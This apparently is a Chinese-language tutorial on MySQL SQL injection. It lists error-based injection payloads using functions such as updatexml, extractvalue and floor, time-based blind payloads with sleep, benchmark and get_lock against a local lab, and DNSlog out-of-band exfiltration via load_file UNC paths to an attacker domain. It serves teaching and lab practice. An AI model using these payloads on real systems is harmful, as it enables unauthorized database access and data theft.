SQL报错注入

出现任意报错可注入
报错函数记五个，固定语法无需理解MySQL十大报错函数 - ZZtac - 博客园
?
1.floor()返回小于等于括号内该值的最大整数，本质是 group by 语句的报错
如：select * from test where id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);———–a和x不能少

2.extractvalue() 从目标XML中返回包含所查询值的字符串函数
如：select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
第一个参数：XML_document是String格式，为XML文档对象的名称，第二个参数：XPath_string (Xpath格式的字符串)查找路径；报错原理同updatexml

3.updatexml() 是使用不同的 XML 标记匹配和替换 XML 块的函数，返回替换的 XML 片段
如：select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
第一个参数是字符串 第二个参数是指定字符串中的一个位置（Xpath格式的字符串） 第三个参数是将要替换成什么符合条件的值
updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误，由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误

4.geometrycollection()传入参数后MYSQL无法画出图形，从而引发报错
如：select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

5.multipoint()为了进行报错显示传入了字符串数据参数，从而导致参数不合法的报错
如：select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

6.polygon()报错注入时构造的payload语句属于嵌套模式，不符合函数的匹配就会导致报错
如：select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

7.multipolygon()
如：select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

8.linestring()通过传入非预期的入参数量和类型无法解析处理后导致报错
如：select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

9.multilinestring()为了显错传入字符串，所以报错
如：select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

10.exp()是以e为底的指数函数，当传递一个大于709的值时，函数就会引起一个溢出错误
表示按位取反，执行成功是0意味着按位取反0，造成DOUBLE溢出错误，类似有pow(),cot()
如：`select * from test where id=1 and exp((select * from(select user())a));`

睡眠注入

MYSQL

？
三种函数：1.sleep 2.benchmark 3.get_lock
http://127.0.0.1/sqli/Less-9/?id=1'and If(ascii(substr(database(),1,1))=115,sleep(5),1)-- -

条件，成功，失败
延迟向下排序，延迟小于所睡眠的时间一定是错误的payloads，大于的需自行判断
这里设置为5，所以延迟小于5000都为错误信息
benchmark函数是MySQL中的一个内置函数，用于执行指定次数的表达式，以测量其性能。它通常用于性能测试和优化，以确定某个操作或函数的执行时间。
执行不同的次数那么执行的时间也就不一样，通过这个函数我们可以达到与sleep()同样的延时目的.

  • count: 表示要执行表达式的次数。
  • expression: 表示要执行的表达式。
    SELECT BENCHMARK(1000000, SHA1(‘Hello World’));（可MD5等）

Get_Lock尝试获取由字符串 str 给出的名称的锁，使用 timeout 秒的超时值。负的 timeout 值表示无限超时。该锁是独占的。在一个会话持有锁时，其他会话无法获取同名的锁。
如果成功获得锁，返回 1；
如果超时（例如，另一个客户端之前已锁定该名称），返回 NULL
或者发生错误（例如，内存耗尽或线程被 mysqladmin kill 杀死）时返回 NULL。

总之就是如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。

DNSlog注入&DNS外带

dnslog简介

Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名www.test.com、t00ls.com.等的访问信息。

dnslog原理

注册了一个为a.com的域名，我将他a记录解析到10.0.0.0上，这样就实现了无论我记录值填什么他都有解析，并且都指向10.0.0.0，当我向dns服务器发起test.a.com的解析请求时，DNSlog中会记录下他给test.a.com解析，解析值为10.0.0.0。（通俗来讲就是我们申请一个dnslog的平台，当我们盲注的时候把想要的数据和平台给的地址拼接起来，dnslog平台就会把请求的记录显示出来。）
==前提：==

  1. root用户密码
  2. 高版本需要secure_file_priv为空，代表读取磁盘的目录（show variables like ‘%secure%’;）
  3. 无目录写入的限制（权限）
  4. 知道目标网站位置，根目录是什么

dnslog盲注原理

对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入,使用DnsLog盲注仅限于Windows环境。
==注意：==

  1. “\\“ 四个\不能少，网络资源路径多加两个\就是转义了反斜杠
  2. 注意.uifm3e.dnslog.cn是你的子域名，前面要加个.
  3. 后面的\xxx.txt，\\是必须的，xxx.txt这部分自定义，不能为空

基础函数

DNSlog进行注入需要用到==load_file()==函数，load_file函数可以解析dns请求。
数据库中使用此payload：select load_file('\\\\SQL注入查询语句.a.com')。

有些地方用Hex编码，编码目的就是减少干扰，因为很多数据库字段的值可能是有特殊符号的，这些特殊符号拼接在域名里是无法做dns查询的，只能是数字，字母，下划线组成否则就无法解析。
注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径（ UNC路径就是类似\\softer这样的形式的网络路径，前面带双斜杠。 格式为：\servername\sharename\directory\filename）。
